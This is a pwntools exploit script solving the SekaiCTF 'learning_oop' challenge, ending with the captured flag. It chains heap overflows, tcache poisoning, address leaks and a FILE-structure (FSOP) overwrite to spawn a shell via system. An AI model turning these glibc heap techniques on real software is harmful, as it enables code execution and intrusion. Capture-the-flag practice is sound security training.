#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
set resolve-heap-via-heuristic force
continue
"""

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
exe = "./learning_oop_patched"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)
lleak = lambda a, b: log.info(a + " = %#x" % b)

# ===================EXPLOIT GOES HERE=======================

# io = remote("learning-oop-5lpgmrkv7vhv.chals.sekai.team", 1337, ssl=True)
io = start()
def adopt(spe, name):
    sla(b"> ", b"1")
    sla(b"): ", f"{spe}".encode())
    sla(b"name: \n", name)

def feed(idx):
    sla(b"> ", b"3")
    sla(b"pet? \n", f"{idx}".encode())

def play(idx):
    sla(b"> ", b"2")
    sla(b"pet? \n", f"{idx}".encode())


# set up
adopt(3, b"0" * 0x100 + p32(0) + p32(3))
recvunt("Adopted new pet: ")
heap = int(io.recvline(), 16)
lleak("heap", heap)

adopt(2, b"1" * 0x100 + p32(0) + p32(3))
adopt(1, b"2" * 0x100 + p32(0) + p32(1))

sla(b"> ", b"6")

# tcache poisoning
mangle = (heap + 0x340) ^ (heap + 0x240) >> 12
payload = b"3" * 0x100 + p32(0) + p32(0x6) + p64(3) + p64(0x121) + p64(mangle)
adopt(1, payload)
adopt(1, b"4" * 0x100 + p32(0) + p32(0x2))
io.interactive()
# overlap chunk
payload = b"5" * 0x100 + p32(0) + p32(0x2) + b"5" * (0x2f0 - 0x110) + p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21)
adopt(1, payload)

# leak pie
recvunt(b"4" * 0xf8)
pie = u64(io.recv(6).ljust(8, b"\x00")) - 0x4c98
lleak("pie", pie)

# set up
payload = b"6" * 0xf0 + p64(0x121) + p64(pie + 0x4c98) + p32(0) + p32(0x2)
adopt(1, payload)

sla(b"> ", b"6")
sla(b"> ", b"6")

# tcache poisoning
mangle = (heap) ^ (heap + 0x120) >> 12
payload = b"7" * 0x100 + p32(0) + p32(0x3) + p64(3) + p64(0x121) + p64(mangle)
adopt(1, payload)
adopt(1, b"8" * 0x100)

# make fake unsortedbin
payload = b"9" * 0x100 + p32(0) + p32(5) + p64(3) + p64(0x521)[:7:]
adopt(1, payload)

# make bk ptr drop to in use chunk (last remainder)
payload = b"A" * 0x100 + p32(0) + p32(2) + p64(3) + p64(0x401) + p64(pie + 0x4c98)[:7:]
adopt(1, payload)

# leak libc
sla(b"> ", b"3")
recvunt(b"A" * 0x100)
recvunt(b"1. ")
libc_base = u64(io.recv(6).ljust(8, b"\x00")) - 0x203b20
lleak("libc_base", libc_base)
sla(b"pet? \n", b"1")

# unsortedbin now corrupt, i cant restore it
# i will set up tcache instead 
sla(b"> ", b"6")

payload = b"B" * 0x100 + p32(0) + p32(0x13) + p64(3) + p64(0x121)[:7:]
adopt(1, payload)

for i in range(0x12):
    sla(b"> ", b"6")

# tcache poisoning to stdout
_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
mangle = (_IO_2_1_stdout_ - 0x120) ^ (heap + 0x240) >> 12
payload = b"C" * 0x100 + p32(0) + p32(5) + p64(3) + p64(0x121) + p64(mangle)
adopt(1, payload)
adopt(1, b"D" * 0x10)

# fsop from  note
system = libc_base + libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)

payload = b"E" * 0x100 + p32(0) + p32(5) + p64(3) + b"E" * 8 + payload
adopt(1, payload)
io.interactive()

#SEKAI{wOw!II1Ii11_UM4Z1NG_3xpl0it_sk1llz!!!!}